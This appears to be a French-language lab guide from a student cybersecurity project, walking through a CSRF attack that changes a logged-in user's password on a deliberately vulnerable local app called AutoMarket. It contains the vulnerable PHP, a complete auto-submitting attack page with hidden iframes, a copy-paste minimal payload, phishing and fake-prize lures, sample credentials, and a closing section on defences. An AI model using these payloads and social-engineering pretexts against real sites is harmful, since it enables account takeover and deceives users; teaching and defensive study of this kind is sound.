===============================================
   GUIDE D'EXPLOITATION - CSRF (Cross-Site Request Forgery)
   SAE Cybersécurité - AutoMarket
===============================================

OBJECTIF : Changer le mot de passe d'un utilisateur connecté 
sans son consentement via une page malveillante

FLAG : FLAG{CSRF_P4SSW0RD_STOLEN_2024}

===============================================
1. COMPRENDRE LA FAILLE
===============================================

CSRF = Cross-Site Request Forgery (Falsification de requête intersite)

L'attaquant crée une page web piégée qui, lorsqu'elle est 
visitée par une victime connectée au site vulnérable, 
exécute des actions à son insu (changer mot de passe, 
faire un virement, modifier des paramètres...).

Conditions nécessaires :
- La victime doit être connectée au site cible
- Le site cible n'a pas de protection CSRF (token)
- La victime doit visiter la page malveillante

===============================================
2. IDENTIFIER LA VULNÉRABILITÉ
===============================================

Sur AutoMarket, la page de profil permet de changer son 
mot de passe via un simple formulaire POST :

URL : http://localhost/index.php?page=profil
Méthode : POST
Paramètre : new_password

Le problème : AUCUN token CSRF n'est vérifié !
Le serveur accepte la requête si l'utilisateur a un cookie 
de session valide, peu importe d'où vient la requête.

Code vulnérable (profil.php) :
------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_password'])) {
    $new_password = password_hash($_POST['new_password'], PASSWORD_DEFAULT);
    // Mise à jour sans vérification de token CSRF !
    $stmt = $pdo->prepare("UPDATE Users SET mdp = ? WHERE id_user = ?");
    $stmt->execute([$new_password, $_SESSION['user_id']]);
}

===============================================
3. CRÉER LA PAGE D'ATTAQUE
===============================================

Créer un fichier HTML attrayant (ex: csrf_attack.html) :

<!DOCTYPE html>
<html>
<head>
    <title>Gagnez un iPhone 15 !</title>
</head>
<body>
    <h1>Félicitations ! Vous avez gagné !</h1>
    
    <!-- Iframes cachés pour l'attaque invisible -->
    <iframe name="hiddenFrame" style="display:none;"></iframe>
    <iframe id="logoutFrame" style="display:none;"></iframe>

    <!-- Formulaire caché qui change le mot de passe -->
    <form action="http://localhost/index.php?page=profil" 
          method="POST" 
          id="hackForm" 
          target="hiddenFrame">
        <input type="hidden" name="new_password" value="hacked">
    </form>

    <script>
        // Soumettre le formulaire automatiquement
        document.getElementById('hackForm').submit();
        
        // Déconnecter la victime après 2 secondes
        setTimeout(function() {
            document.getElementById('logoutFrame').src = 
                "http://localhost/index.php?page=logout";
        }, 2000);
    </script>
</body>
</html>

ASTUCE : Rendre la page plus convaincante avec :
- Une roulette animée
- Des confettis
- Un faux compte à rebours d'urgence
- Un compteur de "personnes regardant la page"

→ Voir le fichier csrf_attack.html fourni pour un exemple complet !

===============================================
4. SCÉNARIO D'EXPLOITATION
===============================================

ÉTAPE 1 : L'attaquant prépare la page malveillante
- Modifier l'URL du formulaire selon le serveur cible
- Choisir le nouveau mot de passe (ex: "hacked")
- Héberger la page sur un serveur ou l'envoyer en pièce jointe

ÉTAPE 2 : L'attaquant envoie le lien à la victime
Exemples de prétextes (ingénierie sociale) :
- "Tu as gagné un concours ! Clique ici : [lien]"
- "Regarde cette promo incroyable : [lien]"
- Email de phishing imitant AutoMarket

ÉTAPE 3 : La victime clique sur le lien
- Elle doit être connectée à AutoMarket
- La page s'ouvre et affiche le contenu trompeur
- En arrière-plan, le formulaire est soumis automatiquement

ÉTAPE 4 : L'attaque s'exécute
- Le mot de passe est changé en "hacked"
- La victime est déconnectée (via iframe caché)
- Elle ne peut plus se reconnecter avec son ancien mot de passe

ÉTAPE 5 : L'attaquant se connecte
- Email de la victime + mot de passe "hacked"
- Accès total au compte !

===============================================
5. TESTER L'ATTAQUE
===============================================

1. Démarrer le serveur (XAMPP/WAMP)
2. Se connecter à AutoMarket avec un compte utilisateur
   Ex: jean@exemple.fr / password1

3. Dans le MÊME navigateur, ouvrir csrf_attack.html
   - Double-cliquer sur le fichier, ou
   - Utiliser simulation_attack.cmd

4. Observer :
   - La roulette tourne
   - Après 2 sec, la session est détruite (invisible)

5. Retourner sur AutoMarket :
   - L'utilisateur est déconnecté
   - Tenter de se reconnecter avec "password1" → ÉCHEC
   - Se connecter avec "hacked" → SUCCÈS !

===============================================
6. PAYLOAD RAPIDE (copier-coller)
===============================================

Version minimale (sans fioritures) :

<html>
<body>
<iframe name="f" style="display:none"></iframe>
<form action="http://localhost/index.php?page=profil" method="POST" target="f" id="x">
<input type="hidden" name="new_password" value="pwned">
</form>
<script>document.getElementById('x').submit();</script>
</body>
</html>

===============================================
7. MESURES DE PROTECTION
===============================================

1. TOKEN CSRF (recommandé)
   - Générer un token unique par session
   - L'inclure dans chaque formulaire
   - Vérifier le token côté serveur

   Exemple :
   $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
   
   Dans le formulaire :
   <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
   
   Vérification :
   if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
       die("Erreur CSRF !");
   }

2. ATTRIBUT SAMESITE SUR LES COOKIES
   session_set_cookie_params(['samesite' => 'Strict']);
   
3. VÉRIFIER L'EN-TÊTE REFERER/ORIGIN
   if (parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) !== 'localhost') {
       die("Requête externe refusée !");
   }

4. DEMANDER RE-AUTHENTIFICATION
   Pour les actions sensibles (changement de mot de passe),
   demander le mot de passe actuel.

5. UTILISER DES FRAMEWORKS MODERNES
   Laravel, Symfony, etc. incluent une protection CSRF par défaut.

===============================================
8. FICHIERS ASSOCIÉS
===============================================

- csrf_attack.html    → Page d'attaque complète avec roulette
- simulation_attack.cmd → Script pour lancer l'attaque
- passwords.txt       → Liste des mots de passe (pour récupération)

===============================================
